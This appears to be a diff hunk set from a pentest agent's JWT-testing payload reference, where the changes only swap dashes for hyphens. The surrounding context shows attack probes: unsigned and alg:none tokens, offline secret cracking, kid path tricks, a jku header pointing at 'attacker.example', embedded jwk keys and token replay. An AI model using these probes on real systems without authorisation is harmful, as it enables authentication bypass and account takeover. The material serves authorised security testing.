@@ -1,4 +1,4 @@
-# payloads — jwt-hunter
+# payloads - jwt-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia de Segurança e Testes em Vulnerabilidades JWT.md` (Section 5: PAYLOADS / PROBES)
 
@@ -10,7 +10,7 @@ rate-limit approval in `security-scope.yaml`.
 
 ## Token Anatomy Reminder
 
-`HEADER.PAYLOAD.SIGNATURE` — three base64url parts.
+`HEADER.PAYLOAD.SIGNATURE` - three base64url parts.
 - Header typically: `{"alg":"HS256","typ":"JWT"}`
 - Payload: app-specific claims (`sub`, `exp`, `iat`, `role`, `admin`, `uid`)
 - Signature: HMAC / RSA over `base64url(header) + "." + base64url(payload)`
@@ -23,7 +23,7 @@ rate-limit approval in `security-scope.yaml`.
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.
 ```
 
-Note the trailing period — the token has three segments, the third is
+Note the trailing period - the token has three segments, the third is
 empty. Some libraries treat this as "no signature to verify".
 
 ## 2. `alg: none` Attack
@@ -64,7 +64,7 @@ eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsInVpZCI6MX0.<ORIGIN
 
 ## 4. HS256 Secret Cracking (Offline)
 
-Only with explicit approval — the secret list is hashed offline, no
+Only with explicit approval - the secret list is hashed offline, no
 traffic to the target.
 
 ```bash
@@ -117,10 +117,10 @@ resolve signing material from attacker-influenced inputs.
 ```
 
 If the library reads `kid` as a filesystem path to a key file,
-`/dev/null` is a zero-length "key" — sign the token with an empty
+`/dev/null` is a zero-length "key" - sign the token with an empty
 secret.
 
-### `jku` — External Key Set URL
+### `jku` - External Key Set URL
 
 ```json
 {"alg":"RS256","jku":"https://attacker.example/jwks.json"}
@@ -129,7 +129,7 @@ secret.
 Host `jwks.json` on attacker-controlled domain; the server fetches it
 and trusts the attacker's public key for signature verification.
 
-### `jwk` — Embedded Key
+### `jwk` - Embedded Key
 
 ```json
 {"alg":"RS256","jwk":{"kty":"RSA","kid":"evil","use":"sig","n":"...","e":"AQAB"}}
@@ -149,7 +149,7 @@ still accepts, `exp` is not being checked.
 2. Log out (or change password) via UI / API.
 3. Replay token A against a protected endpoint.
 
-Expected if vulnerable: 200 on the replay — server has no revocation
+Expected if vulnerable: 200 on the replay - server has no revocation
 store (stateless JWT anti-pattern).
 
 ## 9. Weak Claim Validation
@@ -196,12 +196,12 @@ python3 -c "import jwt; print(jwt.decode('${JWT_TOKEN}', options={'verify_signat
 
 ---
 
-## Important — What NOT To Do
+## Important - What NOT To Do
 
 - Do NOT run `hashcat` against a secret suspected to be cryptographically
   strong (>16 random bytes); that is compute-wasted and generates
   heat/log that gives no signal.
-- Do NOT perform online brute-force of signatures — 100% rate-limit
+- Do NOT perform online brute-force of signatures - 100% rate-limit
   trigger, 0% progress.
-- Do NOT replay a production token against production to "test" — always
+- Do NOT replay a production token against production to "test" - always
   clone the session in a scoped test account.
